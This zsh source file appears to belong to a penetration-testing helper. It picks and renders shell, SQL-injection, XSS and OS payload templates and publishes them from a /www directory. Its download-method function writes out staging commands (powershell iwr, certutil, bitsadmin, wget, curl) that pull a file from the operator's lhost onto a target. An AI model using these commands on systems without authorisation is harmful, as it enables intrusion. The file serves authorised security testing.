# Payload selection, filtering, rendering, and reporting.

ii_cmd_payload() {
  if [[ "${1:-}" == "--help" ]]; then
    cat <<'EOF'
usage: ii payload [CATEGORY]
       ii p [CATEGORY]
       ii p [CATEGORY] -o [PATH]
       ii p -www ln SOURCE_PATH [LINK_NAME]
       ii p -www ls
       ii p -www search [FILTER]
       ii p --input [--copy] [-o [PATH]]

Payload files:
  Open the payload selector, render the selected template, and print the output.

  The selector shows payload paths in the list and a selected template preview
  at the bottom, with renderable tokens highlighted.
  A first-line "# description: ..." metadata line is shown in preview but
  omitted from copied output.
  "# stage: ..." metadata lines are emitted as paste-safe "# --- ... ---"
  comment delimiters for combo payloads.
  The selector starts in normal mode. Press / to search; Esc returns to normal.
  Use y to copy the selected rendered payload without leaving the selector.
  Use w to edit the selected template, write it to /www/p, and copy a download
  command.
  Use l to unfold the selected script into a full preview, and h to
  return to compact normal mode. In unfolded preview, j and k still move
  between payloads, Enter still renders and outputs, w writes/downloads, and q
  aborts.
  Payload files render $name, ${name}, and ${name:t}. Shell values win over ii
  tmux values. Uppercase shell variables such as $RHOST are left unchanged.
  Missing values keep their original token.

Pasted input:
  ii p --input [--copy] [-o [PATH]]

  Paste template text below the prompt. Finish with a single "." line, or cancel
  with a single ":q" or ":q!" line. The renderer uses lowercase shell-style
  variables from this shell first and ii variables second. Use --copy to copy
  the rendered input to the clipboard.

Output:
  -o writes the rendered text to a file while keeping the normal terminal
  output. With no PATH, output goes to /www/p/att.txt. A bare filename writes
  to /www/FILENAME. Directory paths use att.txt. After rendering, ii prints the
  output file note and ends with the absolute output path on its own line.

Write/download flow:
  Press w in the payload selector to edit the selected template in
  ${VISUAL:-${EDITOR:-vi}}. Save and quit the editor to continue, or quit
  without writing to abort. Then enter a filename, default p, and select one
  download command style: powershell-iwr, cmd-certutil, cmd-bitadmin,
  linux-wget, or linux-curl. ii writes the rendered edited script to /www/p,
  copies the rendered download command, and prints the render report. Esc or q
  in the filename or method selector aborts the whole flow.

/www helpers:
  ii p -www ln SOURCE_PATH [LINK_NAME]
    Select a directory under /www and create a symlink to SOURCE_PATH there.

  ii p -www ls
    Print files and directories under /www as a tree.

  ii p -www search [FILTER]
    Fuzzy-select an entry under /www and print its containing directory relative
    to /www, then its absolute path. FILTER preselects the first
    case-insensitive fzf match.

Categories:
  all, shell, script, linux, windows, sqli, xss
EOF
    return 0
  fi

  if [[ "${1:-}" == "--input" ]]; then
    shift
    ii_cmd_payload_input "$@"
    return
  fi

  if [[ "${1:-}" == "-www" ]]; then
    shift
    ii_cmd_payload_www "$@"
    return
  fi

  ii_tmux_available || return
  ii_require_cmd fzf || return

  local filter="all" output=0 output_spec=""
  while [[ $# -gt 0 ]]; do
    case "$1" in
      -o|--output)
        output=1
        shift
        if [[ $# -gt 0 && "${1:-}" != -* ]]; then
          output_spec="$1"
          shift
        fi
        ;;
      *)
        if [[ "$filter" == "all" ]]; then
          filter="$1"
        else
          print -u2 "ii: unknown payload option: $1"
          return 2
        fi
        shift
        ;;
    esac
  done

  local payloads payload selected key line rendered report last_yank_selected last_yank_report last_yank_count footer_status copy_rc
  typeset -g II_PAYLOAD_OUTPUT_PATH=""
  last_yank_selected=""
  last_yank_report=""
  last_yank_count=0
  footer_status=""
  payloads="$(ii_payload_list)" || return
  if [[ -z "$payloads" ]]; then
    print -u2 "ii: no payloads found"
    return 1
  fi

  while true; do
    if ! selected="$(print -r -- "$payloads" | ii_payload_filter "$filter" | ii_payload_entries_for_fzf | ii_payload_select_fzf "$filter" "$footer_status")"; then
      [[ $last_yank_count -gt 0 && -n "$last_yank_report" ]] && print && print -r -- "$last_yank_report"
      return
    fi
    if [[ -z "$selected" ]]; then
      [[ $last_yank_count -gt 0 && -n "$last_yank_report" ]] && print && print -r -- "$last_yank_report"
      return
    fi

    selected="$(ii_fzf_trim_leading_empty_lines "$selected")"
    [[ -n "$selected" ]] || return
    key="${selected%%$'\n'*}"
    if [[ "$key" == "enter" || "$key" == "y" || "$key" == "w" || "$key" == "q" ]]; then
      line="${selected#*$'\n'}"
    else
      key="enter"
      line="${selected%%$'\n'*}"
    fi
    [[ -n "${II_PAYLOAD_KEY:-}" ]] && key="$II_PAYLOAD_KEY"
    selected="$(print -r -- "$line" | awk -F '\t' 'NF {print $1; exit}')"
    [[ -n "$selected" ]] || return

    if [[ "$key" == "q" ]]; then
      [[ $last_yank_count -gt 0 && -n "$last_yank_report" ]] && print && print -r -- "$last_yank_report"
      return
    fi

    payload="$(ii_payload_path_for "$selected")" || return
    ii_payload_render "$payload" >/dev/null || return
    rendered="$II_PAYLOAD_RENDERED_TEXT"

    if [[ "$key" == "w" ]]; then
      ii_payload_write_download_flow "$payload"
      return
    fi

    if [[ "$key" == "y" ]]; then
      report="$(ii_payload_render_report)"
      if ii_clip_copy "$rendered"; then
        copy_rc=0
      else
        copy_rc=1
      fi
      footer_status="$(ii_interact_copy_status "$copy_rc" "payload copied successfully" "payload rendered; clipboard copy failed")"
      last_yank_selected="$selected"
      last_yank_report="$report"
      (( last_yank_count++ ))
      if [[ -n "${II_PAYLOAD_KEY:-}" ]]; then
        print -r -- "$footer_status"
        [[ -n "$last_yank_report" ]] && print && print -r -- "$last_yank_report"
        return
      fi
      continue
    fi

    break
  done

  report="$(ii_payload_render_report)"

  if (( output )); then
    ii_payload_write_output "$rendered" "$output_spec"
  fi

  [[ -n "$report" ]] && print -r -- "$report" && print
  ii_payload_print_separator
  print -r -- "$rendered"
  if [[ $last_yank_count -gt 0 && "$last_yank_selected" != "$selected" && -n "$last_yank_report" ]]; then
    print
    print -r -- "$last_yank_report"
  fi
  ii_payload_print_output_report
}

ii_cmd_payload_input() {
  local copy=0 output=0 output_spec=""

  while [[ $# -gt 0 ]]; do
    case "$1" in
      --copy) copy=1 ;;
      -o|--output)
        output=1
        shift
        if [[ $# -gt 0 && "${1:-}" != -* ]]; then
          output_spec="$1"
        else
          continue
        fi
        ;;
      --help|-h)
        cat <<'EOF'
usage: ii p --input [--copy] [-o [PATH]]

Paste template text below the prompt, then render variables and print the
rendered output.

Finish input with a single "." line. Cancel with a single ":q" or ":q!" line.

Supported input placeholders:
  $name       replace lowercase name
  ${name}     replace lowercase name
  ${name:t}   replace lowercase name with its trailing path component
Uppercase variables and PowerShell scope variables such as $env:, $script:,
$global:, $local:, and $private: are left unchanged.

Shell values win over ii tmux values. Missing values keep the original token and
are reported in red.

-o writes the rendered text to a file while keeping the normal terminal output.
With no PATH, output goes to /www/p/att.txt. A bare filename writes to
/www/FILENAME. Directory paths use att.txt. After rendering, ii prints the
output file note and ends with the absolute output path on its own line.
EOF
        return 0
        ;;
      *)
        print -u2 "ii: unknown payload input option: $1"
        return 2
        ;;
    esac
    shift
  done

  ii_tmux_available || return

  local input rendered report
  typeset -g II_PAYLOAD_OUTPUT_PATH=""
  input="$(ii_payload_read_input)" || return
  ii_payload_render_text "$input" >/dev/null || return
  rendered="$II_PAYLOAD_RENDERED_TEXT"
  report="$(ii_payload_render_report)"

  if (( output )); then
    ii_payload_write_output "$rendered" "$output_spec"
  fi

  if (( copy )); then
    if ii_clip_copy "$rendered"; then
      print "payload copied successfully"
    else
      print "payload rendered; clipboard copy failed"
    fi
    print
  fi

  [[ -n "$report" ]] && print -r -- "$report" && print
  ii_payload_print_separator
  print -r -- "$rendered"
  ii_payload_print_output_report
}

ii_payload_dir() {
  print -r -- "${II_PAYLOAD_DIR:-${HOME}/.config/ii/payloads}"
}

ii_payload_list() {
  local dir
  dir="$(ii_payload_dir)"
  if [[ ! -d "$dir" ]]; then
    print -u2 "ii: payload directory not found: $dir"
    print -u2 "ii: set II_PAYLOAD_DIR or create ~/.config/ii/payloads"
    return 1
  fi

  ( cd "$dir" && find . -type f ! -name '.*' | sed 's#^\./##' | sort )
}

ii_payload_filter() {
  local filter="${1:-all}"

  case "$filter" in
    all|"") cat ;;
    shell) awk '/^shell\//' ;;
    script) awk '/^script\//' ;;
    linux) awk '$0 ~ /(^|\/)linux(\/|$)/' ;;
    windows) awk '$0 ~ /(^|\/)windows(\/|$)/' ;;
    sqli) awk '/^sqli\//' ;;
    xss) awk '/^xss\//' ;;
    *) awk -v pat="$filter" 'index(tolower($0), tolower(pat)) > 0' ;;
  esac
}

ii_payload_select_fzf() {
  local filter="${1:-all}"
  local footer_status="${2:-}"
  local plugin_file payload_dir compact_footer expanded_footer search_footer normal_keys compact_preview_cmd expanded_preview_cmd search_preview_cmd
  plugin_file="${II_PLUGIN_DIR%/}/ii.plugin.zsh"
  payload_dir="$(ii_payload_dir)"
  compact_footer="$(ii_interact_footer "$(ii_interact_keys_payload_normal)" "$footer_status")"
  expanded_footer="$(ii_interact_footer "$(ii_interact_keys_payload_expanded)" "$footer_status")"
  search_footer="$(ii_interact_footer "$(ii_interact_keys_payload_search)" "$footer_status")"
  normal_keys="j,k,y,w,q,l,h,/"
  compact_preview_cmd="II_FZF_FOOTER=${(q)compact_footer} zsh -fc 'source \"\$1\"; export II_PAYLOAD_DIR=\"\$2\"; ii_payload_preview_fzf \"\$3\" \"\$II_FZF_FOOTER\"' -- ${(q)plugin_file} ${(q)payload_dir} {1}"
  expanded_preview_cmd="II_FZF_FOOTER=${(q)expanded_footer} zsh -fc 'source \"\$1\"; export II_PAYLOAD_DIR=\"\$2\"; ii_payload_preview_fzf \"\$3\" \"\$II_FZF_FOOTER\"' -- ${(q)plugin_file} ${(q)payload_dir} {1}"
  search_preview_cmd="II_FZF_FOOTER=${(q)search_footer} zsh -fc 'source \"\$1\"; export II_PAYLOAD_DIR=\"\$2\"; ii_payload_preview_fzf \"\$3\" \"\$II_FZF_FOOTER\"' -- ${(q)plugin_file} ${(q)payload_dir} {1}"

  fzf --ansi --prompt="ii payload:${filter}> " --height=80% --border --delimiter=$'\t' --with-nth=1 \
    --expect=enter \
    --bind="start:$(ii_fzf_modal_start_actions)" \
    --bind="/:show-input+enable-search+change-preview($search_preview_cmd)+unbind($normal_keys)" \
    --bind="esc:clear-query+hide-input+disable-search+change-preview($compact_preview_cmd)+rebind($normal_keys)" \
    --bind='j:down,k:up,y:print(y)+accept,w:print(w)+accept,q:abort' \
    --bind="l:change-preview-window(up,99%,wrap,noinfo)+change-preview($expanded_preview_cmd)+hide-input+disable-search+unbind(/)+rebind(j,k,y,w,q,l,h)" \
    --bind="h:change-preview-window(down,50%,nowrap,noinfo)+change-preview($compact_preview_cmd)+hide-input+disable-search+rebind($normal_keys)" \
    --preview="$compact_preview_cmd" \
    --preview-window='down,50%,nowrap,noinfo' \
    --no-separator
}

ii_payload_entries_for_fzf() {
  local selected
  while IFS= read -r selected; do
    [[ -n "$selected" ]] || continue
    print -r -- "$selected"
  done
}

ii_payload_path_for() {
  local selected="$1"
  local dir
  dir="$(ii_payload_dir)"
  local payload_path="${dir%/}/${selected}"

  if [[ ! -f "$payload_path" ]]; then
    print -u2 "ii: payload not found: $selected"
    return 1
  fi

  print -r -- "$payload_path"
}

ii_payload_render() {
  local payload_path="$1"
  local rendered
  rendered="$(ii_payload_body "$payload_path")"
  ii_payload_render_text "$rendered"
}

ii_payload_print_separator() {
  ii_color_blue "[payload]"
}

ii_payload_output_path() {
  local spec="${1:-}"
  local default_dir="/www/p"
  local default_file="att.txt"

  if [[ -z "$spec" ]]; then
    print -r -- "${default_dir}/${default_file}"
    return
  fi

  if [[ "$spec" == */ || -d "$spec" ]]; then
    print -r -- "${spec%/}/${default_file}"
    return
  fi

  if [[ "$spec" == /* ]]; then
    print -r -- "$spec"
    return
  fi

  if [[ "$spec" == ./* || "$spec" == ../* || "$spec" == */* ]]; then
    print -r -- "$spec"
    return
  fi

  print -r -- "/www/${spec}"
}

ii_payload_write_output() {
  local text="$1"
  local spec="$2"
  local output_path output_abs dir

  typeset -g II_PAYLOAD_OUTPUT_PATH=""

  output_path="$(ii_payload_output_path "$spec")" || return
  dir="${output_path:h}"
  if [[ -z "$dir" || "$dir" == "$output_path" ]]; then
    print -u2 "ii: invalid output path: $output_path"
    return 1
  fi

  if ! mkdir -p -- "$dir"; then
    print -u2 "ii: failed to create output directory: $dir"
    return 1
  fi
  if ! print -rn -- "$text" > "$output_path"; then
    print -u2 "ii: failed to write output file: $output_path"
    return 1
  fi
  output_abs="${output_path:a}"
  typeset -g II_PAYLOAD_OUTPUT_PATH="$output_abs"
}

ii_payload_print_output_report() {
  [[ -n "${II_PAYLOAD_OUTPUT_PATH:-}" ]] || return
  print
  ii_color_blue "payload output written to:"
  print -r -- "$II_PAYLOAD_OUTPUT_PATH"
}

ii_payload_write_download_flow() {
  local payload_path="$1"
  local template edited filename method rendered report output_path command copy_rc

  template="$(ii_payload_preview_text "$payload_path")" || return
  edited="$(ii_payload_edit_template "$template")" || return
  [[ -n "$edited" ]] || return
  filename="$(ii_payload_prompt_download_filename)" || return
  method="$(ii_payload_select_download_method "$filename")" || return
  output_path="$(ii_payload_www_script_path "$filename")" || return

  ii_payload_render_text "$edited" >/dev/null || return
  rendered="$II_PAYLOAD_RENDERED_TEXT"
  ii_payload_write_text_file "$rendered" "$output_path" || return

  ii_payload_build_download_command "$method" "$filename" || return
  command="$II_PAYLOAD_DOWNLOAD_COMMAND"
  report="$(ii_payload_render_report)"

  if ii_clip_copy "$command"; then
    copy_rc=0
  else
    copy_rc=1
  fi

  if (( copy_rc == 0 )); then
    print "download command copied"
  else
    print "download command rendered; clipboard copy failed"
  fi
  [[ -n "$report" ]] && print && print -r -- "$report"
  typeset -g II_PAYLOAD_OUTPUT_PATH="${output_path:a}"
  ii_payload_print_output_report
}

ii_payload_edit_template() {
  local template="$1"
  local tmp before after edited editor
  local -a editor_words

  if [[ -n "${II_PAYLOAD_EDIT_ABORT:-}" ]]; then
    return 1
  fi
  if [[ -v II_PAYLOAD_EDIT_TEXT ]]; then
    print -rn -- "$II_PAYLOAD_EDIT_TEXT"
    return
  fi

  tmp="$(mktemp /tmp/ii-payload-edit.XXXXXX)" || return
  print -rn -- "$template" > "$tmp" || return
  before="$(ii_payload_file_stamp "$tmp")"
  editor="${VISUAL:-${EDITOR:-vi}}"
  editor_words=(${(z)editor})
  if (( ${#editor_words[@]} == 0 )); then
    editor_words=(vi)
  fi
  if ! command "${editor_words[@]}" "$tmp"; then
    command rm -f -- "$tmp" >/dev/null 2>&1
    return 1
  fi
  after="$(ii_payload_file_stamp "$tmp")"
  if [[ "$after" == "$before" ]]; then
    command rm -f -- "$tmp" >/dev/null 2>&1
    return 1
  fi
  edited="$(<"$tmp")"
  command rm -f -- "$tmp" >/dev/null 2>&1
  [[ -n "$edited" ]] || return 1
  print -rn -- "$edited"
}

ii_payload_file_stamp() {
  local path="$1"
  command stat -c '%y' "$path" 2>/dev/null || command stat -f '%m' "$path" 2>/dev/null
}

ii_payload_prompt_download_filename() {
  local raw filename

  if [[ -v II_PAYLOAD_WRITE_NAME_FILTER ]]; then
    raw="$II_PAYLOAD_WRITE_NAME_FILTER"
  else
    raw="$(ii_fzf_input_value "" --prompt='write filename> ' --query='p' --height=40% --border --footer='Return Continue    Esc/q Abort' --bind='q:abort')" || return
  fi
  filename="${raw:-p}"
  if ! ii_payload_valid_download_filename "$filename"; then
    print -u2 "ii: invalid filename: $filename"
    return 1
  fi
  print -r -- "$filename"
}

ii_payload_valid_download_filename() {
  local filename="$1"
  [[ -n "$filename" && "$filename" != "." && "$filename" != ".." && "$filename" != */* && "$filename" != *$'\0'* ]]
}

ii_payload_select_download_method() {
  local filename="$1"
  local filter="${II_PAYLOAD_DOWNLOAD_METHOD_FILTER:-}"
  local root
  root="$(ii_www_root)"

  {
    print -r -- "powershell-iwr"
    print -r -- "cmd-certutil"
    print -r -- "cmd-bitadmin"
    print -r -- "linux-wget"
    print -r -- "linux-curl"
  } | ii_fzf_select_one "$filter" --prompt='download method> ' --height=40% --border \
    --preview="printf 'filename \"%s\" will be written to \"%s\"' ${(q)filename} ${(q)root}/p" \
    --footer='Enter Select    Esc/q Abort' --bind='q:abort'
}

ii_payload_www_script_path() {
  local filename="$1"
  local root dir

  root="$(ii_www_root)"
  dir="${root%/}/p"
  print -r -- "${dir}/${filename}"
}

ii_payload_write_text_file() {
  local text="$1"
  local output_path="$2"
  local dir="${output_path:h}"

  if ! mkdir -p -- "$dir"; then
    print -u2 "ii: failed to create output directory: $dir"
    return 1
  fi
  if ! print -rn -- "$text" > "$output_path"; then
    print -u2 "ii: failed to write output file: $output_path"
    return 1
  fi
}

ii_payload_build_download_command() {
  local method="$1"
  local filename="$2"
  local resolved_lhost url

  typeset -g II_PAYLOAD_DOWNLOAD_COMMAND=""

  ii_payload_resolve_render_var lhost "" '$lhost'
  resolved_lhost="$II_PAYLOAD_RESOLVED_VALUE"
  url="http://${resolved_lhost}/p/${filename}"

  case "$method" in
    powershell-iwr)
      II_PAYLOAD_DOWNLOAD_COMMAND="powershell -c \"iwr -UseBasicParsing '${url}' -OutFile \\\"${filename}\\\"\""
      ;;
    cmd-certutil)
      II_PAYLOAD_DOWNLOAD_COMMAND="certutil -urlcache -f ${url} ${filename}"
      ;;
    cmd-bitadmin)
      II_PAYLOAD_DOWNLOAD_COMMAND="bitsadmin /transfer ii ${url} %TEMP%\\${filename}"
      ;;
    linux-wget)
      II_PAYLOAD_DOWNLOAD_COMMAND="wget ${url} -O ${filename}"
      ;;
    linux-curl)
      II_PAYLOAD_DOWNLOAD_COMMAND="curl -fsSL ${url} -o ${filename}"
      ;;
    *)
      print -u2 "ii: unknown download method: $method"
      return 1
      ;;
  esac
}

ii_payload_read_input() {
  local input line

  if [[ -t 0 ]]; then
    ii_payload_print_input_intro
    ii_payload_print_input_prompt
  fi

  while true; do
    IFS= read -r line || break
    ii_payload_input_is_finish_line "$line" && break
    if ii_payload_input_is_cancel_line "$line"; then
      print -u2 "ii: input cancelled"
      return 1
    fi
    input+="${line}"$'\n'
  done

  print -rn -- "$input"
}

ii_payload_print_input_intro() {
  print -u2 "paste content below"
  print -u2 'finish: single "." line OR ":q"/":q!" line -> cancel, don'\''t save'
}

ii_payload_print_input_prompt() {
  printf 'ii input> ' >&2
}

ii_payload_input_is_finish_line() {
  [[ "$1" == "." ]]
}

ii_payload_input_is_cancel_line() {
  [[ "$1" == ":q" || "$1" == ":q!" ]]
}

ii_payload_render_text() {
  local text="$1"
  local rendered="" length i ch next expr end name modifier token original

  typeset -gA II_PAYLOAD_RENDER_REPORT_SOURCE=()
  typeset -gA II_PAYLOAD_RENDER_REPORT_VALUE=()
  typeset -g II_PAYLOAD_RENDERED_TEXT=""

  length="${#text}"
  i=1
  while (( i <= length )); do
    ch="${text[i]}"
    if [[ "$ch" == '$' ]]; then
      next="${text[i+1]}"
      if [[ "$next" == "{" ]]; then
        end=$(( i + 2 ))
        while (( end <= length )) && [[ "${text[end]}" != "}" ]]; do
          (( end++ ))
        done
        if (( end <= length )); then
          expr="${text[i+2,end-1]}"
          if [[ "$expr" =~ '^([a-z_][a-z0-9_]*)(:t)?$' ]]; then
            name="${match[1]}"
            modifier="${match[2]}"
            original="${text[i,end]}"
            ii_payload_resolve_render_var "$name" "$modifier" "$original"
            rendered+="$II_PAYLOAD_RESOLVED_VALUE"
            i=$(( end + 1 ))
            continue
          elif [[ "$expr" =~ '^II_([A-Za-z_][A-Za-z0-9_]*)$' ]]; then
            name="${(L)match[1]}"
            original="${text[i,end]}"
            ii_payload_resolve_render_var "$name" "" "$original"
            rendered+="$II_PAYLOAD_RESOLVED_VALUE"
            i=$(( end + 1 ))
            continue
          fi
        fi
      elif [[ "$next" =~ '[A-Za-z_]' ]]; then
        end=$(( i + 1 ))
        while (( end <= length )) && [[ "${text[end]}" =~ '[A-Za-z0-9_]' ]]; do
          (( end++ ))
        done
        token="${text[i+1,end-1]}"
        if [[ "$token" =~ '^[a-z_][a-z0-9_]*$' ]]; then
          if [[ "${text[end]}" == ":" ]] && ii_payload_is_powershell_scope "$token"; then
            rendered+="${text[i,end]}"
            i=$(( end + 1 ))
            continue
          fi
          original="${text[i,end-1]}"
          ii_payload_resolve_render_var "$token" "" "$original"
          rendered+="$II_PAYLOAD_RESOLVED_VALUE"
          i="$end"
          continue
        fi
      fi
    fi

    if [[ "$ch" == "I" && "${text[i,i+2]}" == "II_" && ( i == 1 || ! "${text[i-1]}" =~ '[A-Za-z0-9_$]' ) ]]; then
      end="$i"
      while (( end <= length )) && [[ "${text[end]}" =~ '[A-Za-z0-9_]' ]]; do
        (( end++ ))
      done
      token="${text[i,end-1]}"
      if [[ "$token" =~ '^II_([A-Za-z_][A-Za-z0-9_]*)$' ]]; then
        name="${(L)match[1]}"
        original="$token"
        ii_payload_resolve_render_var "$name" "" "$original"
        rendered+="$II_PAYLOAD_RESOLVED_VALUE"
        i="$end"
        continue
      fi
    fi

    rendered+="$ch"
    (( i++ ))
  done

  typeset -g II_PAYLOAD_RENDERED_TEXT="$rendered"
  print -rn -- "$rendered"
}

ii_payload_is_powershell_scope() {
  case "$1" in
    env|script|global|local|private) return 0 ;;
    *) return 1 ;;
  esac
}

ii_payload_resolve_render_var() {
  local name="$1"
  local modifier="$2"
  local original="$3"
  local ii_name line value source

  if (( ${+parameters[$name]} )) && [[ -n "${(P)name}" ]]; then
    value="${(P)name}"
    source="shell"
  else
    ii_name="$(ii_var_normalize_name "$name")" || return
    if ii_tmux_available >/dev/null 2>&1; then
      line="$(ii_var_line_by_name "$ii_name")"
    else
      line=""
    fi
    if [[ -n "$line" && -n "${line#*=}" ]]; then
      value="${line#*=}"
      source="ii"
    else
      value="$original"
      source="missing"
    fi
  fi

  if [[ "$source" != "missing" && "$modifier" == ":t" ]]; then
    value="${value:t}"
  fi

  ii_payload_record_render_var "$name" "$source" "$value"
  typeset -g II_PAYLOAD_RESOLVED_VALUE="$value"
  typeset -g II_PAYLOAD_RESOLVED_SOURCE="$source"
}

ii_payload_record_render_var() {
  local name="$1"
  local source="$2"
  local value="$3"

  if [[ -z "${II_PAYLOAD_RENDER_REPORT_SOURCE[$name]:-}" || "${II_PAYLOAD_RENDER_REPORT_SOURCE[$name]}" == "missing" ]]; then
    II_PAYLOAD_RENDER_REPORT_SOURCE[$name]="$source"
    II_PAYLOAD_RENDER_REPORT_VALUE[$name]="$value"
  fi
}

ii_payload_render_report() {
  local name source value

  for name in ${(ok)II_PAYLOAD_RENDER_REPORT_SOURCE}; do
    source="${II_PAYLOAD_RENDER_REPORT_SOURCE[$name]}"
    value="${II_PAYLOAD_RENDER_REPORT_VALUE[$name]}"
    case "$source" in
      shell)
        ii_color_blue "${name} used from shell: ${value}"
        ;;
      ii)
        print -r -- "${name} used from ii: ${value}"
        ;;
      missing)
        ii_color_red "${name} unresolved: kept as ${value}"
        ;;
    esac
  done
}

ii_payload_preview() {
  local selected="$1"
  local payload description preview_text
  payload="$(ii_payload_path_for "$selected")" || return
  description="$(ii_payload_description "$payload")"
  preview_text="$(ii_payload_preview_text "$payload")" || return
  if [[ -n "$description" ]]; then
    print -r -- "description: $description"
    print -r -- "--------------------------------------------------------------------------------"
  fi
  ii_payload_highlight_preview_text "$preview_text"
}

ii_payload_preview_fzf() {
  local selected="$1"
  local footer="${2:-}"
  local payload description preview_text
  payload="$(ii_payload_path_for "$selected")" || return
  description="$(ii_payload_description "$payload")"
  preview_text="$(ii_payload_preview_text "$payload")" || return
  ii_payload_highlight_preview_text "$preview_text" | ii_fzf_print_preview_blocks "$description" "$footer"
}

ii_payload_preview_text() {
  local payload_path="$1"
  ii_payload_body "$payload_path"
}

ii_payload_highlight_preview_text() {
  local text="$1"
  local highlighted="" length i ch next expr end token original name display

  length="${#text}"
  i=1
  while (( i <= length )); do
    ch="${text[i]}"
    if [[ "$ch" == '$' ]]; then
      next="${text[i+1]}"
      if [[ "$next" == "{" ]]; then
        end=$(( i + 2 ))
        while (( end <= length )) && [[ "${text[end]}" != "}" ]]; do
          (( end++ ))
        done
        if (( end <= length )); then
          expr="${text[i+2,end-1]}"
          if [[ "$expr" =~ '^([a-z_][a-z0-9_]*)(:t)?$' ]]; then
            original="${text[i,end]}"
            highlighted+="$(ii_color_green "$original")"
            i=$(( end + 1 ))
            continue
          elif [[ "$expr" =~ '^II_([A-Za-z_][A-Za-z0-9_]*)$' ]]; then
            name="${(L)match[1]}"
            display='${'"$name"'}'
            highlighted+="$(ii_color_green "$display")"
            i=$(( end + 1 ))
            continue
          fi
        fi
      elif [[ "$next" =~ '[A-Za-z_]' ]]; then
        end=$(( i + 1 ))
        while (( end <= length )) && [[ "${text[end]}" =~ '[A-Za-z0-9_]' ]]; do
          (( end++ ))
        done
        token="${text[i+1,end-1]}"
        if [[ "$token" =~ '^[a-z_][a-z0-9_]*$' ]]; then
          if [[ "${text[end]}" == ":" ]] && ii_payload_is_powershell_scope "$token"; then
            highlighted+="${text[i,end]}"
            i=$(( end + 1 ))
            continue
          fi
          original="${text[i,end-1]}"
          highlighted+="$(ii_color_green "$original")"
          i="$end"
          continue
        fi
      fi
    fi

    if [[ "$ch" == "I" && "${text[i,i+2]}" == "II_" && ( i == 1 || ! "${text[i-1]}" =~ '[A-Za-z0-9_$]' ) ]]; then
      end="$i"
      while (( end <= length )) && [[ "${text[end]}" =~ '[A-Za-z0-9_]' ]]; do
        (( end++ ))
      done
      token="${text[i,end-1]}"
      if [[ "$token" =~ '^II_([A-Za-z_][A-Za-z0-9_]*)$' ]]; then
        name="${(L)match[1]}"
        display='$'"$name"
        highlighted+="$(ii_color_green "$display")"
        i="$end"
        continue
      fi
    fi

    highlighted+="$ch"
    (( i++ ))
  done

  print -rn -- "$highlighted"
}

ii_payload_description() {
  local payload_path="$1"
  awk '
    NR == 1 && $0 ~ /^# description:[[:space:]]*/ {
      sub(/^# description:[[:space:]]*/, "")
      print
      exit
    }
  ' "$payload_path"
}

ii_payload_body() {
  local payload_path="$1"
  awk '
    NR == 1 && $0 ~ /^# description:[[:space:]]*/ { next }
    $0 ~ /^# stage:[[:space:]]*/ {
      label = $0
      sub(/^# stage:[[:space:]]*/, "", label)
      if (label == "") {
        label = "stage"
      }
      print "# --- " label " ---"
      next
    }
    { print }
  ' "$payload_path"
}
